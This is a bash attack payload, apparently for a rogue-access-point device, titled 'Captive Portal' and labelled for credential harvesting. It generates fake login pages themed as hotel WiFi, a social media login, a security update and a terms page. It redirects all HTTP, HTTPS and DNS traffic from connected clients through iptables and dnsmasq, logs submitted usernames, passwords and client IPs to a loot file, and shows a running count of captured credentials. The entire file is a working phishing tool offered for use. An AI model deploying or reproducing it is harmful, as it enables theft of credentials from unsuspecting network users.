#!/bin/bash
# Title: Captive Portal
# Author: NullSec
# Description: Creates custom captive portal for credential harvesting
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/captiveportal"
mkdir -p "$LOOT_DIR"

PROMPT "CAPTIVE PORTAL

Create a custom captive
portal for credential
harvesting.

Features:
- Multiple portal themes
- Custom HTML injection
- Credential logging
- Auto-redirect clients
- Session tracking

WARNING: Social eng attack

Press OK to configure."

# Check dependencies
MISSING=""
command -v uhttpd >/dev/null 2>&1 || MISSING="${MISSING}uhttpd "
command -v iptables >/dev/null 2>&1 || MISSING="${MISSING}iptables "

if [ -n "$MISSING" ]; then
    ERROR_DIALOG "Missing tools:
$MISSING

Install with opkg."
    exit 1
fi

# Find AP interface
AP_IFACE=""
for i in wlan0 wlan1 br-lan; do
    if iwinfo "$i" info 2>/dev/null | grep -q "Mode: Master"; then
        AP_IFACE="$i"
        break
    fi
done
[ -z "$AP_IFACE" ] && AP_IFACE="wlan0"

PORTAL_IP=$(ip addr show "$AP_IFACE" | grep "inet " | awk '{print $2}' | cut -d'/' -f1)
PORTAL_IP=${PORTAL_IP:-"172.16.42.1"}

PROMPT "PORTAL TEMPLATE:

1. WiFi Login (hotel)
2. Social Media Login
3. Software Update
4. Terms & Conditions
5. Custom HTML

Select template next."

TEMPLATE=$(NUMBER_PICKER "Template (1-5):" 1)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) TEMPLATE=1 ;; esac

PORTAL_DIR="/tmp/captive_portal_$$"
mkdir -p "$PORTAL_DIR"

# Generate portal HTML based on template
case $TEMPLATE in
    1) PORTAL_TITLE="WiFi Access - Please Sign In"
       PORTAL_FIELDS='<input type="text" name="email" placeholder="Email Address" required>
<input type="password" name="password" placeholder="Password" required>'
       PORTAL_BUTTON="Connect to WiFi"
       ;;
    2) PORTAL_TITLE="Verify Your Account"
       PORTAL_FIELDS='<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>'
       PORTAL_BUTTON="Sign In"
       ;;
    3) PORTAL_TITLE="Critical Security Update"
       PORTAL_FIELDS='<input type="text" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Current Password" required>
<input type="password" name="new_password" placeholder="New Password" required>'
       PORTAL_BUTTON="Update Now"
       ;;
    4) PORTAL_TITLE="Terms of Service"
       PORTAL_FIELDS='<input type="text" name="name" placeholder="Full Name" required>
<input type="text" name="email" placeholder="Email" required>
<input type="checkbox" name="agree" required> I agree to the Terms'
       PORTAL_BUTTON="Accept & Connect"
       ;;
    5) PORTAL_TITLE=$(TEXT_PICKER "Page title:" "Login")
       case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PORTAL_TITLE="Login" ;; esac
       PORTAL_FIELDS='<input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>'
       PORTAL_BUTTON="Submit"
       ;;
esac

PORTAL_PORT=$(NUMBER_PICKER "Portal port:" 80)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) PORTAL_PORT=80 ;; esac

resp=$(CONFIRMATION_DIALOG "START CAPTIVE PORTAL?

Template: $TEMPLATE
Title: $(echo "$PORTAL_TITLE" | head -c 25)
Port: $PORTAL_PORT
Interface: $AP_IFACE
IP: $PORTAL_IP

Clients will be
redirected to portal.

Confirm?")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

SPINNER_START "Building portal..."

TIMESTAMP=$(date +%Y%m%d_%H%M)
CRED_FILE="$LOOT_DIR/creds_$TIMESTAMP.log"
touch "$CRED_FILE"

# Create index page
cat > "$PORTAL_DIR/index.html" << HTMLEOF
<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>$PORTAL_TITLE</title>
<style>
body{font-family:Arial,sans-serif;background:#f0f2f5;margin:0;padding:20px}
.container{max-width:400px;margin:40px auto;background:#fff;border-radius:8px;padding:30px;box-shadow:0 2px 10px rgba(0,0,0,.1)}
h2{text-align:center;color:#1a73e8;margin-bottom:20px}
input[type="text"],input[type="password"],input[type="email"]{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box}
button{width:100%;padding:12px;background:#1a73e8;color:#fff;border:none;border-radius:4px;cursor:pointer;font-size:16px;margin-top:10px}
button:hover{background:#1557b0}
.footer{text-align:center;color:#666;font-size:12px;margin-top:20px}
</style>
</head>
<body>
<div class="container">
<h2>$PORTAL_TITLE</h2>
<form method="POST" action="/capture">
$PORTAL_FIELDS
<button type="submit">$PORTAL_BUTTON</button>
</form>
<div class="footer">Secure Connection &bull; Protected</div>
</div>
</body>
</html>
HTMLEOF

# Create CGI capture script
mkdir -p "$PORTAL_DIR/cgi-bin"
cat > "$PORTAL_DIR/cgi-bin/capture" << 'CGIEOF'
#!/bin/sh
echo "Content-Type: text/html"
echo ""

# Read POST data
read POST_DATA

# Log credentials with timestamp
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')
CLIENT_IP="$REMOTE_ADDR"
echo "$TIMESTAMP | $CLIENT_IP | $POST_DATA" >> CRED_FILE_PLACEHOLDER

echo "<html><body><h2>Connected!</h2><p>Please wait while we set up your connection...</p>"
echo "<script>setTimeout(function(){window.location='http://www.google.com';},5000);</script>"
echo "</body></html>"
CGIEOF
sed -i "s|CRED_FILE_PLACEHOLDER|$CRED_FILE|g" "$PORTAL_DIR/cgi-bin/capture"
chmod +x "$PORTAL_DIR/cgi-bin/capture"

# Create success redirect
cat > "$PORTAL_DIR/success.html" << 'SEOF'
<!DOCTYPE html>
<html><body><h2>Connected!</h2><p>Redirecting...</p>
<script>setTimeout(function(){window.location='http://www.google.com';},3000);</script>
</body></html>
SEOF

# Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Set up iptables redirect for DNS and HTTP
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -A PREROUTING -i "$AP_IFACE" -p udp --dport 53 -j DNAT --to-destination "$PORTAL_IP:53" 2>/dev/null

# Start web server
uhttpd -p "$PORTAL_IP:$PORTAL_PORT" -h "$PORTAL_DIR" -c /cgi-bin -f 2>/dev/null &
HTTPD_PID=$!

# Start DNS redirect (all DNS queries -> portal IP)
if command -v dnsmasq >/dev/null 2>&1; then
    echo "address=/#/$PORTAL_IP" > /tmp/captive_dns.conf
    dnsmasq -C /tmp/captive_dns.conf --no-daemon --no-resolv --no-hosts -p 5353 2>/dev/null &
    DNS_PID=$!
fi

SPINNER_STOP

LOG "Captive portal active on $PORTAL_IP:$PORTAL_PORT"

PROMPT "CAPTIVE PORTAL ACTIVE!

Portal: $PORTAL_IP:$PORTAL_PORT
Template: $TEMPLATE
Interface: $AP_IFACE

Credentials logged to:
$CRED_FILE

Press OK to monitor.
Press OK again to stop."

# Monitor loop
while true; do
    CRED_COUNT=0
    [ -f "$CRED_FILE" ] && CRED_COUNT=$(wc -l < "$CRED_FILE" | tr -d ' ')
    LAST_ENTRY=$(tail -1 "$CRED_FILE" 2>/dev/null | head -c 50)

    resp=$(CONFIRMATION_DIALOG "PORTAL MONITOR

Credentials: $CRED_COUNT
Last: $LAST_ENTRY

Continue monitoring?")
    [ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && break
    sleep 5
done

# Cleanup
SPINNER_START "Stopping portal..."
kill $HTTPD_PID 2>/dev/null
kill $DNS_PID 2>/dev/null
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 80 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p tcp --dport 443 -j DNAT --to-destination "$PORTAL_IP:$PORTAL_PORT" 2>/dev/null
iptables -t nat -D PREROUTING -i "$AP_IFACE" -p udp --dport 53 -j DNAT --to-destination "$PORTAL_IP:53" 2>/dev/null
rm -rf "$PORTAL_DIR" /tmp/captive_dns.conf
SPINNER_STOP

CRED_TOTAL=0
[ -f "$CRED_FILE" ] && CRED_TOTAL=$(wc -l < "$CRED_FILE" | tr -d ' ')

PROMPT "PORTAL STOPPED

Total credentials: $CRED_TOTAL

Saved to:
$CRED_FILE

Press OK to exit."
